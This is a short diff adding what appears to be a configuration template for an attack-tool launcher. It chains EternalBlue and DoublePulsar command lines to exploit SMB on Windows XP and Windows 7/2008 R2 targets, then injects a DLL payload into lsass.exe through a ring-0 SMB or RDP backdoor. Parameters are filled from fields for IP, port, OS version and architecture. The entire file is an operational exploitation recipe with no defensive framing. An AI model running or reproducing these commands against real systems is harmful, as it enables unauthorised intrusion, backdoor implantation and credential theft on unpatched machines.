@@ -1,0 +1,33 @@
+<sfjt>inject</sfjt>
+<ljfs>NB,NR,MR,CS</ljfs>
+<sctype>dll</sctype>
+<cs1mc>IP地址</cs1mc>
+<cs2mc>端口</cs2mc>
+<cs3mc>系统版本</cs3mc>
+<cs4mc>系统架构</cs4mc>
+<cs5mc>后门注入服务</cs5mc>
+<zbz>2</zbz>
+<bz1><cmd>Eternalblue-2.2.0.exe --TargetIp <cs1/> --Target <cs3/> --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort <cs2/> --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12</cmd></bz1>
+<bz2><cmd>Doublepulsar-1.3.1.exe --TargetIp <cs1/> --TargetPort <cs2/> --DllPayload <sc/> --DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol <cs5/> --Architecture <cs4/> --Function Rundll</cmd></bz2>
+
+<bz1fk>Eternalblue backdoor inject is ready!</bz1fk>
+<bz2fk>DLL backdoor inject is ready！！</bz2fk>
+
+<bz>系统版本：
+XP
+ Windows XP 32-Bit All Service Packs
+WIN72K8R2
+ Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+
+系统架构：
+X86
+ 32位
+X64
+ 64位
+
+后门注入服务：
+SMB
+ Ring 0 SMB (TCP 445) backdoor
+RDP
+ Ring 0 RDP (TCP 3389) backdoor
+</bz>
